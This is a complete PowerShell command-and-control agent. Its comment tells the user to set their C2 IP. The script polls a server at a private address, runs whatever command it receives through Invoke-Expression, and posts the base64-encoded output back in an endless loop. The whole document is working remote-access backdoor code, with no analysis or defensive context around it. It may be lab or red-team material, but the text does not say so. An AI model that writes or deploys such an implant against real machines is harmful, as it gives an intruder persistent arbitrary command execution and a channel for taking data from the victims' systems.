$server = "http://192.168.1.193:8080"  # Change to match your C2 IP

function CheckIn {
    $body = @{ client_id = $env:COMPUTERNAME } | ConvertTo-Json
    Invoke-WebRequest -Uri "$server/checkin" -Method POST -Body $body -ContentType "application/json" | Out-Null
}

function GetCommand {
    $body = @{ client_id = $env:COMPUTERNAME } | ConvertTo-Json
    $response = Invoke-WebRequest -Uri "$server/getcmd" -Method POST -Body $body -ContentType "application/json"
    $cmd = ($response.Content | ConvertFrom-Json).cmd
    return $cmd
}

function SendResult($output) {
    $body = @{
        client_id = $env:COMPUTERNAME
        result = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($output))
    } | ConvertTo-Json -Depth 2
    Invoke-WebRequest -Uri "$server/result" -Method POST -Body $body -ContentType "application/json" | Out-Null
}

while ($true) {
    CheckIn
    Start-Sleep -Seconds 5

    $cmd = GetCommand
    if ($cmd -ne "") {
        try {
            $output = Invoke-Expression $cmd | Out-String
        } catch {
            $output = "Error executing command: $_"
        }
        SendResult $output
    }
}
